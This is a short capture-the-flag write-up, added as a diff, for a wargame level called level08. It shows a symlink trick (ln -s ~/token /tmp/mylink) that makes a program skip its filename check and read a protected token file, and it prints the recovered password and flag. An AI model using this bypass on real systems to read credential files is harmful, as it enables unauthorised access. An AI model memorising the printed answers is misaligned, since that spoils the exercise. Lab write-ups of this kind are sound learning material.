@@ -1,0 +1,7 @@
+we see that when given a file, it displays its content, but refuses to do it for ~/token
+so we try a Symlink exploit which is doing a simbolic link to the file we are interrested into
+
+ln -s ~/token /tmp/mylink
+
+and then : ./level08 /tmp/mylink gives us the pass for flag08 which is : quif5eloekouj29ke0vouxean !
+then su flag08 with this as passsword, getflag gives us : 25749xKZ8L7DkSCwJkT9dyv6f
